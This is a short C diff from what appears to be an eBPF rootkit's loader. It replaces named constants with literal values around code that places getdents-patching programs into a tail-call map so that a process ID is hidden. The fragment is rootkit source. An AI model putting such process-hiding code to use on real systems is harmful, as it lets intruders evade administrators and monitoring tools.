@@ -227,7 +227,7 @@ int main(int argc, char **argv) {
   struct pr0be_safe *sfobj;
   struct bpf_program *progboop = NULL;
   struct ring_buffer *rb = NULL;
-  char pid[MAXPIDLEN];
+  char pid[16];
 
   // ===========================================================================
   // [xcap]
@@ -268,7 +268,7 @@ int main(int argc, char **argv) {
       return 1;
     }
     boopprintf("  ->   eBPF Probe Loaded     : %s\n", cfg.pr0besafepath);
-    int index = PROG_01;
+    int index = 1;
     int prog_fd = bpf_program__fd(sfobj->progs.handle_getdents_exit);
     int ret = bpf_map_update_elem(bpf_map__fd(sfobj->maps.map_prog_array),
                                   &index, &prog_fd, BPF_ANY);
@@ -276,7 +276,7 @@ int main(int argc, char **argv) {
       boopprintf("Failed to hide PID: %s\n", strerror(errno));
       return 1;
     }
-    index = PROG_02;
+    index = 2;
     prog_fd = bpf_program__fd(sfobj->progs.handle_getdents_patch);
     ret = bpf_map_update_elem(bpf_map__fd(sfobj->maps.map_prog_array), &index,
                               &prog_fd, BPF_ANY);
